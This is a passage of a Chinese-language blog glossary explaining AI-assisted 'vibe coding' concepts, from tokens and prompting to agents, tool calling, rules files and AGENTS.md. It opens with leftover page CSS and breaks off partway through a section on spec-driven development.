h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Vibe Coding 概念大全</h2>
<blockquote>
<ul>
<li>本文内容基于公开资料整理与个人实践总结，力求用清晰易懂的方式，带你一文掌握 AI 编程的核心术语</li>
</ul>
</blockquote>
<h3 data-id="heading-1">AI 基础概念</h3>
<h4 data-id="heading-2">人工智能（AI）</h4>
<blockquote>
<p>说白了，就是让电脑学会像人一样动脑子——能理解问题、自己学东西、还能想办法解决。 在 Vibe Coding 里，AI 就相当于你随叫随到的编程搭子：你只要说清楚想干啥，它立马帮你把代码写好，跟有个程序员朋友全天候待命差不多。</p>
</blockquote>
<h4 data-id="heading-3">大语言模型（<code>LLM</code>）</h4>
<blockquote>
<p>大语言模型（<code>LLM</code>）就是一种特别能“说人话”的AI，像 <code>ChatGPT</code>、Claude 这些都是它的代表。 它之所以叫“大”，是因为背后有几十亿甚至上万亿个“小开关”（参数）在运作——读过的资料越多、学得越深，就越聪明，但同时也更费电脑资源。</p>
<p>你可以把它想象成一个通宵啃完全世界书和代码的超级学霸：你让它写代码、讲代码、改bug，它基本都能搞定，因为它啥都见过、啥都练过。</p>
</blockquote>
<h4 data-id="heading-4">模型参数</h4>
<blockquote>
<p>模型的“参数”其实就是它学到的知识，用一堆数字存着。参数越多，说明这模型“脑子”里装的东西越多，通常也就越聪明。</p>
<p>举个例子：</p>
<ul>
<li><code>GPT-4</code> 脑子最大，有大约1.8万亿个参数；</li>
<li><code>Claude 3.5 Sonnet</code> 没公布具体数字，但估计也有几千亿；</li>
<li><code>DeepSeek-V3</code> 有6710亿个参数。</li>
</ul>
<p>不过，参数多也意味着更“烧钱”——不仅训练贵，用起来也更费电、更占资源。所以一般来说：参数越多，能力越强，但花的钱和算力也越多。</p>
</blockquote>
<h4 data-id="heading-5">训练和推理</h4>
<blockquote>
<p>训练和推理，就是AI的“学习”和“考试”两个阶段。</p>
<p><strong>训练</strong>：相当于AI在“上学”，拼命看海量数据（比如书、代码、网页），把知识学到脑子里。这个过程特别费时间、费电脑，一般只有大公司才干得起，普通人不用操心。</p>
<p><strong>推理</strong>：就是AI“学成出山”后，你问它问题，它用学到的东西给你回答——比如你跟<code>ChatGPT</code>聊天、让它写代码，这时候它就是在“答题”。</p>
<p>简单说：训练是AI自己埋头苦读，推理是你用它现成的本事。我们平时用AI，其实都是在用它的“考试能力”。</p>
</blockquote>
<h4 data-id="heading-6">微调（Fine-tuning）</h4>
<blockquote>
<p>微调就像是给一个已经大学毕业的AI“再上个专业培训班”。</p>
<p>它本来啥都懂一点，但如果你拿一堆医学资料或者你公司的代码专门训练它一阵子，它就能在那个领域变得更专业、更对口。</p>
<p>不过，搞微调要花不少钱和精力，对普通人来说有点“杀鸡用牛刀”。大多数时候，直接用现成的AI就完全够用了，不用自己折腾。</p>
</blockquote>
<h3 data-id="heading-7">Token 和计费</h3>
<h4 data-id="heading-8">Token</h4>
<blockquote>
<p>Token 就是 AI 看文字时的“最小计数单位”，你可以把它当成“词块”或者“字块”。</p>
<ul>
<li>英文里，一个单词（比如 "hello"）大概算 1 个 token，有时候一个词还会被拆成几块。</li>
<li>中文更“费”一点，一个汉字通常算 1 到 2 个 token，所以中文比英文更容易“烧”token。</li>
</ul>
<p>为啥要关心这个？因为用 AI 是按 token 收费的——你输入的问题 + AI 回答的内容，全都要算进去。用得越多，花得越多。</p>
<p>举个例子：</p>
<ul>
<li>“Hello World” ≈ 2 个 token</li>
<li>“你好世界” ≈ 4 到 6 个 token</li>
</ul>
<p>所以，别小看多打几个字，可能就多花几分钱！</p>
</blockquote>
<h4 data-id="heading-9">输入 Token 和输出 Token</h4>
<blockquote>
<p>用 AI 时，收费是分开算的：</p>
<ul>
<li><strong>你发给 AI 的内容</strong>（比如问题、代码、文件）算“输入 token”；</li>
<li><strong>AI 回给你的答案</strong>（比如解释、生成的代码）算“输出 token”。</li>
</ul>
<p>而且通常 <strong>输出比输入更贵</strong>，因为让 AI “动脑子写东西”比“看懂你在说啥”更费劲、更耗资源。</p>
<p><strong>省钱妙招</strong>： 别啰嗦，提示词尽量写得清楚又简洁。这样 AI 一次就搞明白你要干啥，不用来回问好几轮——既省 token，又省时间！</p>
</blockquote>
<h4 data-id="heading-10">上下文窗口</h4>
<blockquote>
<p><strong>上下文窗口</strong>就是 AI 一次能“看”和“记住”多少内容，用 token 来算。你可以把它想象成 AI 的“临时记忆容量”。</p>
<p>不同模型这个容量差别很大：</p>
<ul>
<li>GPT-4o 能记大约 10 万字中文；</li>
<li>Claude 3.5 Sonnet 能记约 15 万字；</li>
<li>Gemini 2.0 Pro 更猛，能记下差不多 150 万字——相当于一本小书了！</li>
</ul>
<p><strong>好处是</strong>：代码文件特别大、对话历史特别长的时候，大窗口模型不会“忘前事”，处理起来更顺畅。</p>
<p><strong>但注意</strong>：窗口越大，每次用的 token 就越多，花的钱也越多。所以别盲目追求大，够用就行——就像吃饭，吃太撑反而浪费。</p>
</blockquote>
<h3 data-id="heading-11">提示词相关</h3>
<h4 data-id="heading-12">提示词（Prompt）</h4>
<blockquote>
<p><strong>提示词</strong>就是你跟 AI 说话的方式——你告诉它要干啥，越清楚，它干得越好。</p>
<p>别只说“做个网站”这种模糊话，那等于让别人“做顿饭”，却不说是中餐还是西餐。 好的提示词得<strong>具体、带背景、说清格式</strong>，比如：</p>
<blockquote>
<p>“用 React 做个蓝色主题的记账网站，要有添加支出、查看列表、统计总额这三个功能。”</p>
</blockquote>
<p>这样 AI 才能精准干活，不瞎猜。</p>
<p>另外，AI 对话其实有三种“角色”：</p>
<ul>
<li><strong>系统提示</strong>（你看不见）：悄悄告诉 AI “你是个程序员，要专业、简洁”；</li>
<li><strong>你发的消息</strong>（用户提示）：就是你的需求或问题；</li>
<li><strong>AI 回的</strong>（助手提示）：它的回答。</li>
</ul>
<p>知道这三块有啥用？比如调试时，你可以假装前面已经聊过几轮，把上下文“喂”给 AI，它就能更懂你在说啥，不用从头解释。</p>
<p>总之：<strong>会说话，AI 才会办事</strong>。</p>
</blockquote>
<h4 data-id="heading-13">系统提示词</h4>
<blockquote>
<p><strong>系统提示词</strong>就像是你在 AI 开工前，悄悄给它立的“人设”和“规矩”。</p>
<p>比如你告诉它：</p>
<blockquote>
<p>“你是个资深 React 开发，说话要专业，代码要简洁清晰。”</p>
</blockquote>
<p>那接下来整个对话里，它都会按这个角色来回答——不会突然跑偏去讲 Python，也不会写一堆啰嗦的注释。</p>
<p>这个设置是<strong>全程生效</strong>的，而且对用户自己不可见（但能影响 AI 的表现）。 所以，如果你希望 AI 更像某个领域的专家、语气更正式或更随意，都可以通过系统提示词提前“调教”好。</p>
<p>简单说：<strong>系统提示词 = 给 AI 定角色、定风格、定规矩的幕后指令</strong>。</p>
</blockquote>
<h4 data-id="heading-14">提示词工程</h4>
<blockquote>
<p><strong>提示词工程</strong>说白了，就是“怎么跟 AI 把话说到位”的技巧。</p>
<p>你不是随便问一句，而是<strong>有策略地组织语言</strong>，让 AI 一眼就明白你要啥、怎么干、干成什么样。 在 Vibe Coding 里，这本事特别值钱——会写提示词的人，往往一两句话就能让 AI 输出高质量代码；不会的，可能来回折腾好几轮还跑偏。</p>
<p>所以，<strong>提示词工程 = 用最聪明的方式指挥 AI，少废话、快出活、结果准</strong>。 它不是玄学，而是一门“让 AI 听懂人话”的实用技能。</p>
</blockquote>
<h4 data-id="heading-15">零样本提示（Zero-shot）</h4>
<blockquote>
<p><strong>零样本提示</strong>就是你直接给 AI 下命令，不给例子、不带示范，全靠它自己“凭经验”干活。</p>
<p>比如你直接说：“把这段英文翻译成中文。” AI 就会调用它以前学过的东西，试着完成任务。</p>
<p>这种方式适合<strong>简单、常见的任务</strong>，比如翻译、解释概念、写个基础函数——因为这些它见得太多了，不用教也会。</p>
<p>但要是任务比较冷门或复杂，光靠零样本可能不够准，这时候就得给点例子（也就是“少样本提示”）帮它理解。</p>
<p>简单说：<strong>零样本 = 一句话直接吩咐，AI 靠老本儿干活</strong>。能行就行，不行就得多教两招。</p>
</blockquote>
<h4 data-id="heading-16">少样本提示（Few-shot）</h4>
<blockquote>
<p><strong>少样本提示</strong>就是“先给 AI 打个样”，让它照着你的格式或风格来干活。</p>
<p>比如你想让 AI 翻译，但又怕它乱翻，就先写两三个例子：</p>
<blockquote>
<p>英文：Hello → 中文：你好 英文：Thank you → 中文：谢谢</p>
</blockquote>
<p>然后你再给新句子，它就会<strong>模仿你给的格式</strong>，乖乖输出“中文：早上好”这种一致的结果。</p>
<p>这种方式特别适合：</p>
<ul>
<li>你有特定格式要求（比如日志、表格、代码注释）</li>
<li>或者任务有点模糊，光说不清，得看例子才明白</li>
</ul>
<p>简单说：<strong>少样本提示 = 先示范，再干活，AI 学得快、做得准</strong>。比干巴巴下命令靠谱多了。</p>
</blockquote>
<h4 data-id="heading-17">思维链提示（Chain-of-Thought）</h4>
<blockquote>
<p><strong>思维链提示</strong>就是让 AI 别急着“脱口而出”，而是像人一样<strong>一步一步想清楚再答</strong>。</p>
<p>你只要在问题里加一句：“请一步一步思考”或者“Let’s think step by step”，AI 就会先把问题拆解、分析逻辑、理清步骤，最后再给答案。</p>
<p>这招对<strong>复杂问题特别管用</strong>——比如写一个带多个功能的程序、排查奇怪的 bug，或者处理有陷阱的逻辑题。 因为 AI 一旦跳过思考直接写代码，很容易漏掉细节；但让它“出声思考”（哪怕只是文字），往往能写出更合理、更靠谱的代码。</p>
<p>简单说：<strong>加一句“慢慢想”，AI 就从“抢答选手”变成“认真解题的学霸”</strong> 。结果更准，结构也更清晰。</p>
</blockquote>
<h4 data-id="heading-18">Markdown 语言</h4>
<blockquote>
<p><strong>Markdown 就是用简单符号快速排版文字的方法</strong>，比如：</p>
<ul>
<li>用 <code>#</code> 写标题</li>
<li>用 <code>**加粗**</code> 让字变粗</li>
<li>用 <code>-</code> 列清单</li>
</ul>
<p>在 Vibe Coding 里，它特别常用，因为：</p>
<ul>
<li>AI 回答你时，默认就用 Markdown 格式（带标题、代码块、列表等）</li>
<li>项目说明文件（比如 <code>README</code>）基本都是用 Markdown 写的</li>
<li>一些规则或配置文档也是 Markdown</li>
</ul>
<p>所以，<strong>会点 Markdown，你就能看得懂 AI 的输出，也能写出整洁专业的文档</strong>——不用点鼠标调格式，敲几个符号就行，又快又清爽。</p>
</blockquote>
<h3 data-id="heading-19">AI 编程模式</h3>
<h4 data-id="heading-20">Vibe Coding</h4>
<blockquote>
<p>Vibe Coding 是计算机大牛 <code>Andrej Karpathy</code> 在 2025 年初提出来的一个新玩法：你不用自己敲代码，只要用大白话告诉 AI 你想要什么功能、希望程序怎么运行，AI 就能帮你写出能跑的代码。</p>
<p>说白了，编程的重点不再是记语法、写细节，而是你能把自己的想法说清楚。就像点外卖——你不用会做菜，但得知道自己想吃啥，剩下的交给厨房（也就是 AI）搞定</p>
</blockquote>
<h4 data-id="heading-21"><code>Agentic Coding</code> 智能体编程</h4>
<blockquote>
<p><code>Agentic Coding</code> 就是让 AI 像个能自己动脑干活的“小助手”，不光听你问才答，还能主动规划、动手、检查、修错。</p>
<p>比如在 Cursor 的 Agent 模式里，它能自己看代码、想方案、改文件、跑测试，发现问题还能自动修好——整个过程不用你一步步指挥。 说白了，它不是“问答机”，而是“办事员”，能独立搞定一整套复杂任务。</p>
</blockquote>
<h4 data-id="heading-22">多智能体协作</h4>
<blockquote>
<p>多智能体协作，说白了就是让几个 AI 各干各的活儿，像组了个小团队一起搞项目。</p>
<p>比如你想做个网站：一个 AI 负责搭整体结构，一个写页面（前端），一个搞后台逻辑（后端），还有一个专门挑毛病、查代码漏洞。它们互相配合，不用你挨个指挥。</p>
<p>这两年这玩法越来越火，因为单个 AI 再聪明也容易顾此失彼，而“团队作战”才能扛得住真正复杂的活儿——就像没人指望一个人又当设计师又当程序员还当测试员，对吧？</p>
</blockquote>
<h4 data-id="heading-23">智能体编排</h4>
<blockquote>
<p>编排其实就是当“AI 团队的包工头”。</p>
<p>你有一堆 AI 智能体，各自会干点活，但谁先干、谁后干、怎么传数据、结果怎么拼起来——这些都得有人安排。编排器就是干这个的：不亲自写代码，但把整个流程理顺，让每个 AI 在对的时间干对的事。</p>
<p>就像乐队指挥，自己不吹号不拉琴，但一抬手，小提琴进，鼓点跟上，铜管收尾——整首曲子才不乱套。没它，一群 AI 各自为战，反而容易搞砸。</p>
</blockquote>
<h4 data-id="heading-24">Agent Loop 智能体循环</h4>
<blockquote>
<p>Agent Loop 说白了，就是 AI 干活的“思考-动手-检查”循环。</p>
<p>它不是一次性给你答案就完事，而是像人一样反复折腾： 先看看现在啥情况（比如读代码、看报错）， 然后想“接下来该干啥”， 接着动手改、跑命令、写点东西， 再回头瞅一眼“改对了没？跑通了吗？”， 要是不行，就再来一轮——直到搞定为止。</p>
<p>用 Cursor Agent 的时候，你其实是在放一个会自己试错、调整、死磕到底的 AI 程序员在干活。理解这点，你就知道为啥它有时候要来回跑好几次——不是卡了，是在认真闭环。</p>
</blockquote>
<h4 data-id="heading-25"><code>ReAct</code> 推理与行动</h4>
<blockquote>
<p><code>ReAct</code>（Reasoning and Acting）</p>
<p><code>ReAct</code> 其实就是让 AI 学会“边想边干，干了再想”。</p>
<p>以前的 AI 要么光说不练（只输出答案），要么瞎干一通（直接执行不思考）。<code>ReAct</code> 改变了这个毛病：它让 AI 先动脑子——“现在啥情况？该怎么做？”；然后动手试一试；做完马上看结果对不对；如果不对，立刻调整思路再来。</p>
<p>这就像你修电脑：先判断是不是网线松了（推理），去插紧（行动），看能不能上网（观察），不行就换思路查路由器（再推理）…… AI 用 <code>ReAct</code> 就是这么一步步靠谱地把复杂任务搞定的。现在的智能编程工具，背后基本都靠这套逻辑撑着。</p>
</blockquote>
<h4 data-id="heading-26">工具调用</h4>
<blockquote>
<p>工具调用，其实就是让 AI 从“嘴炮”变成“能动手”的关键一步。</p>
<p>AI 本身只会生成文字，干不了实际的事。但通过工具调用，它能在需要时“喊人帮忙”——比如读文件、跑命令、查网页、连数据库等等。</p>
<p>整个过程分四步，特别像你指挥一个实习生：</p>
<ol>
<li><strong>看出问题</strong>：AI 想，“光靠我说不行，得查点东西”；</li>
<li><strong>选对工具</strong>：决定是读文件、还是调 <code>API</code>；</li>
<li><strong>下指令</strong>：不是自己干，而是说清楚“请用 XX 工具，参数是 A、B、C”；</li>
<li><strong>收结果再处理</strong>：等系统真把结果拿回来，它再结合这个信息继续干活或回答你。</li>
</ol>
<p>重点来了：AI 并不直接操作电脑，它只是“开单子”，真正执行的是背后的程序。</p>
<p>在 Vibe Coding 里，这套机制就是 AI 的“手和脚”。比如 Cursor 的 Agent 模式，之所以能自动改代码、跑测试，全靠它不断调用外部工具——没这能力，AI 再聪明也只能纸上谈兵。</p>
</blockquote>
<h4 data-id="heading-27">Agent Skills 智能体技能</h4>
<blockquote>
<p><code>Agent Skills</code> 就像是给 AI 装“专业插件包”，让它临时变成某个领域的老手。</p>
<p>Anthropic 在 2025 年底搞了个标准：你只要建个文件夹，放个 <code>SKILL.md</code> 说明文档，再配上脚本、规则或参考资料，AI 遇到相关任务时就会自动“加载这个技能”。</p>
<p>比如：</p>
<ul>
<li>你有个 <strong><code>PDF</code> 表单填写</strong> 的 Skill，AI 原本不会处理 <code>PDF</code>，但一加载它，立马知道怎么填；</li>
<li>你团队有套特殊的 <strong>上线部署流程</strong>？写成一个 Skill，AI 就能照着你的规矩来，不用你每次手把手教；</li>
<li>想让 AI 按你们项目的风格 <strong>审查代码</strong>？丢个代码规范 Skill 给它，它就按你的标准挑毛病。</li>
</ul>
<p>最关键的是，AI 不会一股脑把所有技能都塞进脑子——只在真正用得上的时候才调出来。这样既省资源，又不卡顿，就像人一样：平时不用记怎么做心肺复苏，等真遇到急救场景，才翻手册或调用训练记忆。</p>
<p>说白了，Skills 让 AI 从“通才”变成“随叫随到的专家”。</p>
<p>Skills 的核心设计是 <strong>渐进式披露</strong>：AI 只在需要时才加载相关内容，不会一次性把所有信息都塞进上下文，既节省 Token 又保持灵活性</p>
</blockquote>
<h4 data-id="heading-28"><code>A2A</code>（Agent-to-Agent）</h4>
<blockquote>
<p><code>A2A</code>（Agent-to-Agent）说白了，就是给 AI 们定一套“团队聊天规则”。</p>
<p>单个 AI 再厉害，干大活也容易抓瞎。但如果几个 AI 能像同事一样互相说话、分任务、同步进度，事情就好办多了。 <code>A2A</code> 就是让它们能<strong>互相理解、协调行动</strong>的底层约定——比如一个 AI 说“前端我搞定了，后端你接着来”，另一个就能听懂并接上。</p>
<p>没有这套协议，每个 AI 都是孤岛；有了它，它们才能真组成一个配合默契的“AI 小组”，一起搞定复杂项目。 就像打篮球，光个人技术好不够，得会传球、喊话、看队友位置——<code>A2A</code> 就是 AI 团队的“场上沟通”。</p>
</blockquote>
<h4 data-id="heading-29"><code>BMAD</code> 敏捷 AI 开发方法</h4>
<blockquote>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fbmad-code-org%2FBMAD-METHOD" target="_blank" title="https://github.com/bmad-code-org/BMAD-METHOD" ref="nofollow noopener noreferrer">BMAD-METHOD</a>（Breakthrough Method of Agile AI-Driven Development，突破性敏捷 AI 驱动开发方法）是一套系统化的 AI 智能体开发框架，旨在将原本混乱的 AI 编程过程变得结构化、可复用。</p>
<p><code>BMAD</code> 方法，说白了就是给 AI 编程“立规矩、分角色”，把原来靠感觉瞎跑的 AI 开发，变成一套像正规军打仗一样的流程。</p>
<p>它把整个开发过程拆成几个明确角色，每个 AI 负责一块：</p>
<ul>
<li><strong>分析师 AI</strong>：搞清楚用户是谁、市场要啥，输出项目简报；</li>
<li><strong>产品经理 AI</strong>：把简报变成具体功能清单（<code>PRD</code>）；</li>
<li><strong>架构师 AI</strong>：设计技术方案，决定用什么框架、怎么搭系统。</li>
</ul>
<p>而且 AI 还分两种：</p>
<ul>
<li><strong>简单 AI</strong>：干点小事，比如写个文档、查个代码，一个文件搞定；</li>
<li><strong>专家 AI</strong>：能记住上次干到哪，有自己的“工作台”（专属文件夹），适合长期复杂任务，比如从零搭一个 <code>App</code>。</li>
</ul>
<p>每个 AI 都有清晰的“人设”——你是谁、说话啥风格、能干啥、怎么配合别人，全都标准化了。不是随便乱聊，而是各司其职、按流程推进。</p>
<p>这套方法在 <code>GitHub</code> 上火到几万星，说明大家终于意识到：光靠一个 AI 盲打蛮干不行，得像管理真人团队一样，让 AI 有分工、有纪律、有记忆——这才真正把 AI 变成了靠谱的开发伙伴。
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/df8993e0806c4344a8971d24d34f0717~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YeR6YeR6YeRX18=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770704918&amp;x-signature=66UUGLpu5VeFRc9GNbGxvlfOXBs%3D" alt="image-20260203134822554.png" loading="lazy"/></p>
</blockquote>
<h4 data-id="heading-30">Browser Use 浏览器使用</h4>
<blockquote>
<p>Browser Use 说白了，就是让 AI 能像真人一样“自己开浏览器干活”。</p>
<p>它不靠网站提供 <code>API</code>，而是直接操作网页：点按钮、填表单、翻页面、抓数据——就跟你在电脑前手动操作一模一样。</p>
<p>典型用法比如：</p>
<ul>
<li>让 AI 自己去网上搜资料、比价格、整理信息；</li>
<li>把网页上的表格或新闻自动扒下来变成结构化数据；</li>
<li>帮你填那种又长又烦的在线申请表；</li>
<li>甚至跨多个网站串着操作，比如先查航班、再订酒店、最后发邮件确认。</li>
</ul>
<p>关键优势是：<strong>AI 能直接用你已经登录的浏览器</strong>。你不用给每个网站写接口，也不用担心没开放 <code>API</code>——只要你能打开的网页，AI 基本都能操作。</p>
<p>现在像 Cursor、Claude Code 这些工具都内置了这能力，写代码时能自动开浏览器预览、跑测试；开源项目比如 Browser-Use 也让你用 Python 调大模型来控制浏览器。</p>
<p>一句话总结：Browser Use 让 AI 真正“上网”，而不只是“联网说话”。</p>
</blockquote>
<h4 data-id="heading-31">Computer Use 计算机使用</h4>
<blockquote>
<p>Computer Use 就是让 AI 从“会说话”升级成“会动手操作你整个电脑”。</p>
<p>和只能在浏览器里点点点的 Browser Use 不同，Computer Use 能干的事更广： 它能看屏幕、移动鼠标、敲键盘、开软件、跑命令行——就像有个看不见的数字员工坐在你电脑前干活。</p>
<p>它是这么工作的：</p>
<ol>
<li><strong>看一眼屏幕</strong>（截屏分析当前界面）</li>
<li><strong>想下一步干啥</strong>（比如“点这个保存按钮”）</li>
<li><strong>动手操作</strong>（模拟鼠标点击或键盘输入）</li>
<li><strong>看结果对不对</strong>，不对就再调整</li>
</ol>
<p>当然，为了安全，这功能一般跑在虚拟机里，不会真动你本机文件——除非你明确授权。</p>
<p>Anthropic 在 2026 年基于这个技术推出了 <strong><code>Claude Cowork</code></strong>，一个能直接帮你整理下载文件夹、从截图里抠数据填表格、甚至做品牌周报的桌面助手。 它不再只是聊天框里的“嘴替”，而是真正能进你工作流、碰你文件、用你软件的“同事”。</p>
<p>说到底，Computer Use 标志着 AI 从“回答问题”迈进了“替你做事”的时代——不是写代码给你，而是直接在你电脑上把事办了。</p>
</blockquote>
<h3 data-id="heading-32">上下文管理</h3>
<h4 data-id="heading-33">上下文（Context）</h4>
<blockquote>
<p>上下文，就是 AI 回答问题时能“看到”的所有背景信息。</p>
<p>比如：你们之前聊了啥、你当前打开了哪些代码文件、项目整体长什么样、配置是怎么设的，还有你额外给的文档或说明——这些都算。</p>
<p>你给的上下文越准、越全，AI 写出来的东西就越贴合你的实际需求。 这就像带新同事接手项目：你要是只说“你改一下登录功能”，他可能瞎改；但如果你顺手把相关文件、设计稿、历史问题都指给他看，他立马就能上手干对事。</p>
<p>所以，别光提需求，多让 AI “看见”你的项目现场——它才能真帮上忙。</p>
</blockquote>
<h4 data-id="heading-34">上下文工程</h4>
<blockquote>
<p>上下文工程，说白了就是“给 AI 喂刚好够用的信息”，不多不少，刚刚好。</p>
<p>太多信息？AI 容易懵、跑偏，还费钱； 太少信息？它根本不知道你在干啥，瞎猜一通。</p>
<p>所以高手会这样干：</p>
<ul>
<li>只塞<strong>最相关的代码文件</strong>，别把整个项目一股脑扔进去；</li>
<li>附上几句<strong>关键背景</strong>，比如“这是个电商后台，用户要能一键退款”；</li>
<li>用规则文件（比如 <code>.ai-rules.md</code>）告诉 AI 你们项目的命名规范、技术栈、禁忌；</li>
<li>还会定期<strong>清理旧对话</strong>，别让上周聊的登录功能干扰今天改的支付逻辑。</li>
</ul>
<p>本质上，上下文工程不是堆信息，而是<strong>精准投喂</strong>——像给同事递工具，你要的是扳手，我就递扳手，不连锤子锯子螺丝刀全砸你桌上。</p>
<p>这样 AI 才能又快又准地干活。</p>
</blockquote>
<h4 data-id="heading-35">规则文件</h4>
<blockquote>
<p>规则文件（Rules File）是放在项目中的配置文件，用来告诉 AI 你的项目规范、技术栈、代码风格等信息。有了规则文件，AI 每次生成代码时都可以参考这些规则，生成的代码更符合你的项目风格，省去了反复强调的麻烦。</p>
<p>不同 AI 编程工具使用不同的规则文件格式：</p>
<ul>
<li><code>Cursor</code>：早期使用 <code>.cursorrules</code> 单文件格式，现在推荐使用 <code>.cursor/rules/*.mdc</code> 多文件格式</li>
<li><code>Claude Code</code>：使用 <code>CLAUDE.md</code> 文件</li>
<li><code>GitHub Copilot</code>：使用 <code>.github/copilot-instructions.md</code> 文件</li>
</ul>
<p>以 <code>Cursor</code> 为例，现代的 <code>.mdc</code> 规则文件支持 <code>YAML</code> 元数据，可以指定规则的适用范围：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-meta">---</span>
<span class="hljs-attr">description:</span> <span class="hljs-string">React</span> <span class="hljs-string">组件开发规范</span>
<span class="hljs-attr">globs:</span> <span class="hljs-string">src/components/**/*.tsx</span>
<span class="hljs-attr">alwaysApply:</span> <span class="hljs-literal">false</span>
<span class="hljs-meta">---</span>
<span class="hljs-comment"># React 规范</span>
<span class="hljs-bullet">-</span> <span class="hljs-string">使用函数式组件</span>
<span class="hljs-bullet">-</span> <span class="hljs-string">优先使用</span> <span class="hljs-string">hooks</span>
</code></pre>
<p>规则文件的激活方式有多种，比如：</p>
<ul>
<li>始终生效：设置 <code>alwaysApply: true</code></li>
<li>模式匹配：当引用匹配 <code>globs</code> 的文件时自动激活</li>
<li>手动调用：在对话中用 <code>@规则名</code> 引用</li>
<li>AI 自主决定：AI 根据任务相关性自动加载</li>
</ul>
<p>💡 注意，随着工具版本的更新，这些文件的名称和标准可能会发生改变，一切以工具官方文档为主。</p>
</blockquote>
<h4 data-id="heading-36"><code>AGENTS.md</code></h4>
<blockquote>
<p><code>AGENTS.md</code> 说白了，就是专给 AI 看的“项目操作手册”。</p>
<p>你平时写的 <code>README.md</code> 是给人看的——讲项目是干啥的、怎么安装； 而 <code>AGENTS.md</code> 是给 AI 编程助手用的——告诉它：<strong>在这个项目里，具体该怎么干活</strong>。</p>
<p>比如：</p>
<ul>
<li>跑起来要输什么命令（<code>npm run dev</code>）</li>
<li>测试怎么执行（<code>npm test</code>）</li>
<li>代码命名规矩（组件用 <code>PascalCase</code>，工具函数用 <code>camelCase</code>）</li>
<li>用的是 <code>TypeScript</code> 严格模式……</li>
</ul>
<p>AI 工具（像 Cursor、Claude Code、Copilot 等）一打开你的项目，只要看到根目录有 <code>AGENTS.md</code>，就会自动读取里面的内容，不用你再重复叮嘱“记得用 TS”“别乱改启动方式”。</p>
<p>这文件现在成了一个开放标准，几万个开源项目都在用。 相当于你给所有 AI 助手发了一张“上岗须知”——它们一进门就知道规矩，直接上手干对事，不添乱。</p>
<p>一句话：<code>README.md</code> 告诉人“这是什么”，<code>AGENTS.md</code> 告诉 AI“该怎么干”。</p>
<p>一个典型的 <code>AGENTS.md</code> 文件大概长这样：</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section"># 项目设置</span>
<span class="hljs-bullet">-</span> 安装依赖：npm install
<span class="hljs-bullet">-</span> 启动开发：npm run dev
<span class="hljs-bullet">-</span> 运行测试：npm test
​
<span class="hljs-section"># 代码规范</span>
<span class="hljs-bullet">-</span> 使用 TypeScript 严格模式
<span class="hljs-bullet">-</span> 组件文件使用 PascalCase 命名
<span class="hljs-bullet">-</span> 工具函数使用 camelCase 命名
</code></pre>
</blockquote>
<h4 data-id="heading-37"><code>SDD</code> 规范驱动开发</h4>
<blockquote>
<p><code>SDD</code>（规范驱动开发）说白了，就是<strong>先写清楚“到底要干啥”，再让 AI 动手写代码</strong>——把需求变成“法律”，AI 必须照章办事。</p>
<p>以前我们常是：边想边写、写完再补文档，结果代码和需求对不上，改来改去全是坑。 <code>SDD</code> 反过来：<strong>规范文档是唯一真相源</strong>，代码只是它的“执行结果”。</p>
<p>你可以把它理解成给项目立一部“宪法”：</p>
<ul>
<li>功能要实现什么？</li>
